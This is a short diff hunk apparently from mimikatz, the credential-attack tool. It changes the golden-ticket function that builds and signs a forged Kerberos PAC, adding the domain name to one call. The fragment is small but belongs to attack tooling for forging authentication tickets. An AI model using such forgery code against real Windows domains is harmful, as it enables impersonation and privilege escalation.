@@ -635,7 +635,7 @@ PBERVAL kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, LPCWST
 	{
 		if(pValidationInfo = kuhl_m_pac_infoToValidationInfo(&lifetime->TicketStart, username, domainname, LogonDomainName, sid, userid, groups, cbGroups, sids, cbSids))
 		{
-			if(kuhl_m_pac_validationInfo_to_PAC(pValidationInfo, NULL, NULL, SignatureType, pClaimsSet,sid, userid, &pacType, &pacTypeSize))
+			if(kuhl_m_pac_validationInfo_to_PAC(pValidationInfo, NULL, NULL, SignatureType, pClaimsSet,sid, userid, domainname, &pacType, &pacTypeSize))
 			{
 				kprintf(L" * PAC generated\n");
 				status = kuhl_m_pac_signature(pacType, pacTypeSize, SignatureType, key, keySize);
